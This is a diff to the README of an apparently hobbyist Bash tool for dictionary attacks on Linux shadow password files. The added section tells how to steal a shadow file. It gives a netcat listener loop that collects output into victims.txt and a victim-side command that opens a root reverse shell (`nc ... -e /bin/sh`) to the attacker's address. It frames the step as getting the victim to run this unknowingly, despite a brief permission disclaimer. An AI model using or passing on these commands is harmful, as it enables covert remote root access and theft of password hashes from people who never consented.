@@ -1,6 +1,19 @@
 # Shadow_Dictionary
 A quick Bash script that can perform a dictionary attack against a shadow file to find passwords
 
+# How do we get a shadow file?
+A simple way could be a basic netcat attack. Though this approach is not likely to work in the real world, and you should only play around with this idea in a network you own or have permission to.
+## Attacker
+Setting up the attack is as simple as running this command on your machine:
+```
+while true; do nc -l -p 5000 < netcat_attack.sh >> victims.txt; done
+```
+## Victim
+Here is where this sort of attack becomes impractical in the real world. We need to get your victim to run this command on their machine somehow without them knowing what it does.
+```
+sudo nc 192.168.2.250 5000 -e /bin/sh
+```
+
 # What is a shadow file?
 ## From the man page for shadow
 shadow is a file which contains the password information for the system's accounts and optional aging information.
